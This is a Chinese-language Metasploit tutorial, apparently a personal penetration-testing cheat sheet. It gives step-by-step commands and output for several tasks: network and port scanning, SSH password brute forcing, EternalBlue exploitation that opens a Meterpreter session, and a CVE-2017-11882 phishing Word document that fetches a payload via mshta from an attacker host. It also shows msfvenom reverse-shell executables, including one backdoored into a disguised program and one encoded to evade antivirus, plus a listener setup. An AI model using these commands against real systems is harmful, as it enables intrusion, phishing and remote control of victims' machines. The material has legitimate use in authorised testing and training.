## MSF

- Auxiliary（辅助）：Auxiliary 模块通常用于辅助渗透测试，如端口扫描、服务识别、漏洞扫描等。这些模块通常不执行攻击，但可以为攻击提供有用的信息。
- Encoders（编码器）：Encoders 模块用于编码 Metasploit 的 Payload，以避免 Payload 被防病毒软件检测出来。
- Evasion（逃避）：Evasion 模块旨在帮助绕过防御系统，包括防火墙、Web 应用程序防护系统和入侵检测系统等。这些模块能够对Payload  进行混淆、伪装或打包，以助于绕过防御系统检测，从而提高攻击成功的概率。
- Exploits（漏洞利用）：Exploits 模块用于执行漏洞利用攻击。这些模块通常需要针对特定的漏洞，或配合特定的 Payload 使用
- Nops（空操作）：Nops 模块用于填充 Payload 中的空间，以确保 Payload 的有效载荷长度达到指定的大小。
- Payloads（负载）：Payloads 模块用于创建不同类型的 Payload，包括反向 Shell Payload、Meterpreter Payload 等.
- Post（后渗透）：Post 模块用于在攻击成功后执行一系列的后渗透操作，包括查找敏感信息、建立持久性、执行特权操作等

---



| 命令          | 解释                                                |
| ------------- | --------------------------------------------------- |
| msfconsole    | 命令行模式启动MSF                                   |
| exit          | 退出MSF 控制台终端，退出会话                        |
| use           | 使用某一个模块                                      |
| info          | 查看模块的详细信息                                  |
| set           | 模块选项设置                                        |
| show options  | 查看脚本配置选项                                    |
| run / exploit | 启动脚本                                            |
| search        | 搜索关键字 type:auxiliary path:telnet cve:2018-7600 |
| back          | 退出模块                                            |
| show targets  | 显示适用的主机类型                                  |
| show payloads | 显示适用的payload 类型                              |
| background    | 显示适用的payload 类型                              |
| sessions -i   | 会话管理                                            |

 搜索命令用法示例

```
search ms17_010
search bluekeep
search CVE:2018-7600
search type:auxiliary path:telnet
```

> 主机发现
>
> Metasploit 中提供了一些辅助模块可用于主机发现 `auxiliary/scanner/discovery/*`
>
> 使用arp_sweep 来枚举本地局域网中的所有活跃主机

```sh
msf6 > use auxiliary/scanner/discovery/arp_sweep
msf6 auxiliary(scanner/discovery/arp_sweep) > set RHOSTS 10.9.69.0/24
RHOSTS => 10.9.69.0/24
msf6 auxiliary(scanner/discovery/arp_sweep) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/discovery/arp_sweep) > run
```

> 端口扫描
>
> Metasploit 的辅助模块中提供了几款实用的端口扫描器 `auxiliary/scanner/portscan/*`
>
> 一般情况下推荐使用syn 端口扫描器，因为他的扫描速度较快，结果比较准确且不易被对方察觉

```sh
msf6 > search type:auxiliary path:portscan
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/scanner/portscan/ftpbounce normal No FTP Bounce Port Scanner
 1 auxiliary/scanner/natpmp/natpmp_portscan normal No NAT-PMP External Port Scanner
 2 auxiliary/scanner/sap/sap_router_portscanner normal No SAPRouter Port Scanner
 3 auxiliary/scanner/portscan/xmas normal No TCP "XMas" Port Scanner
 4 auxiliary/scanner/portscan/ack normal No TCP ACK Firewall Scanner
 5 auxiliary/scanner/portscan/tcp normal No TCP Port Scanner
 6 auxiliary/scanner/portscan/syn normal No TCP SYN Port Scanner
Interact with a module by name or index. For example info 6, use 6 or use auxiliary/scanner/portscan/syn
msf6 > use 6
msf6 auxiliary(scanner/portscan/syn) > set RHOSTS 10.9.65.1
RHOSTS => 10.9.65.1
msf6 auxiliary(scanner/portscan/syn) > set PORTS 1-100,3389,3306,1521,1433,7001,6379
PORTS => 1-100,3389,3306,1521,1433,7001,6379
msf6 auxiliary(scanner/portscan/syn) > set THREADS 50000
THREADS => 50000
msf6 auxiliary(scanner/portscan/syn) > run
[+] TCP OPEN 10.9.65.1:23
[+] TCP OPEN 10.9.65.1:80
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/syn) >
```

> 服务详细信息
>
> 在Metasploit 中可以调用系统中的命令，比如可以使用Nmap 探测目标的详细服务信息

```
msf6 > sudo nmap -A -p- -sS -sC -T4 -Pn 10.9.69.151
```

> 服务查点
>
> 在Metasploit 的辅助模块中，有很多用于服务扫描和查点的工具，这些工具通常以类似的方式ssh_version 命名。该模块可用于遍历网络 中包含某种服务的主机，并进一步确定服务的版本。下例使用SSH 服务查点

```sh
msf6 > search ssh_version
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/fuzzers/ssh/ssh_version_15 normal No SSH 1.5 Version Fuzzer
 1 auxiliary/fuzzers/ssh/ssh_version_2 normal No SSH 2.0 Version Fuzzer
 2 auxiliary/fuzzers/ssh/ssh_version_corrupt normal No SSH Version Corruption
 3 auxiliary/scanner/ssh/ssh_version normal No SSH Version Scanner
 
msf6 > use 3
msf6 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 10.9.69.0/24
RHOSTS => 10.9.69.0/24
msf6 auxiliary(scanner/ssh/ssh_version) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/ssh/ssh_version) > show options
Module options (auxiliary/scanner/ssh/ssh_version):
 Name Current Setting Required Description
 ---- --------------- -------- -----------
 RHOSTS 10.9.69.0/24 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:
<path>'
 RPORT 22 yes The target port (TCP)
 THREADS 50 yes The number of concurrent threads (max one per host)
 TIMEOUT 30 yes Timeout for the SSH probe
msf6 auxiliary(scanner/ssh/ssh_version) > run
```

> 口令猜测
>
> 在确定了网络上的SSH 服务之后，可以使用MSF 中的ssh_login 模块对SSH 服务进行口令猜测攻击，在进行口令攻击之前，需要一个好用的 用户名和口令字典。

```sh
msf6 > search ssh_login
Matching Modules
================
 # Name Disclosure Date Rank Check Description
 - ---- --------------- ---- ----- -----------
 0 auxiliary/scanner/ssh/ssh_login normal No SSH Login Check Scanner
 1 auxiliary/scanner/ssh/ssh_login_pubkey normal No SSH Public Key Login Scanner
Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/ssh/ssh_login_pubkey
msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 10.9.65.178
RHOSTS => 10.9.65.178
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME flag4
USERNAME => flag4
msf6 auxiliary(scanner/ssh/ssh_login) > set PASS_FiLE /usr/share/john/password.lst
PASS_FiLE => /usr/share/john/password.lst
msf6 auxiliary(scanner/ssh/ssh_login) > set THREADS 40
THREADS => 40
msf6 auxiliary(scanner/ssh/ssh_login) > run
[*] 10.9.65.178:22 - Starting bruteforce
[+] 10.9.65.178:22 - Success: 'flag4:orange' 'uid=1001(flag4) gid=1001(flag4) groups=1001(flag4) Linux DC-1 3.2.0-6-
486 #1 Debian 3.2.102-1 i686 GNU/Linux '
[*] Command shell session 1 opened (10.9.65.228:40151 -> 10.9.65.178:22) at 2021-05-09 22:53:35 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/ssh_login) >
```

> 网站敏感目录扫描
>
> 可以借助Metasploit 中的辅助模块来进行敏感目录扫描。他们主要使用暴力猜解的方式工作，注意此处需要提供一个目录字典

```sh
msf6 > use auxiliary/scanner/http/dir_scanner
msf6 auxiliary(scanner/http/dir_scanner) > set RHOSTS 10.9.65.178
RHOSTS => 10.9.65.178
msf6 auxiliary(scanner/http/dir_scanner) > set THREADS 50
THREADS => 50
msf6 auxiliary(scanner/http/dir_scanner) > run
```

> 扫描内网中存在特定漏洞的主机
>
> windows

```sh
exploit/windows/smb/ms08_067_netapi
auxiliary/scanner/smb/smb_ms17_010
auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

---

> 主动渗透攻击
>
> 以永恒之蓝为例

```sh
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.9.65.224
RHOSTS => 10.9.65.224
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
...
[+] 10.9.65.224:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.9.65.224:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.9.65.224:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 2 opened (10.9.65.228:4444 -> 10.9.65.224:58943) at 2021-05-09 23:11:58 -0400
meterpreter >
```

---

> 被动渗透攻击
>
> 以office2007-2016为例

下载利用脚本

```
┌──(ajest💋zh-CN)-[~/tools/office]
└─$ git clone https://github.com/starnightcyber/CVE-2017-11882.git
┌──(ajest💋zh-CN)-[~/tools/office]
└─$ cd CVE-2017-11882
┌──(ajest💋zh-CN)-[~/tools/office/CVE-2017-11882]
└─$ ls
Command_CVE-2017-11882.py example PS_shell.rb README.md
```

与MSF 联动

```
msf6 > use exploit/ajest/office_cve_2017_11882
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(ajest/office_cve_2017_11882) > set SRVPORT 80
SRVPORT => 80
msf6 exploit(ajest/office_cve_2017_11882) > set URIPATH /a
URIPATH => /a
msf6 exploit(ajest/office_cve_2017_11882) > run
```

生成钓鱼文档

```
┌──(ajest💋zh-CN)-[~/tools/office/CVE-2017-11882]
└─$ python Command_CVE-2017-11882.py -c "mshta http://10.9.69.77/a" -o 如何给女朋友过八十大寿.doc
[*] Done ! output file >> 如何给女朋友过八十大寿.doc <<
```

----

### msfvenom

可以利用msfvenom 生成ShellCode，形式多样，从多种编程语言到多平台，再到多种文件格式。简单来说就是生成“木马后门”。

```
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.9.69.77 lport=4444 -f exe -o payload.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.9 lport=4444 -x wecheat.exe -k -f exe -o wecheat.exe
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.9.69.77 lport=4444 -i 12 -e x86/shikata_ga_nai -f exe -o
payload.exe
```

开启msf 监听

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.10.9
LHOST => 10.10.10.9
msf6 exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf6 exploit(multi/handler) > run
```

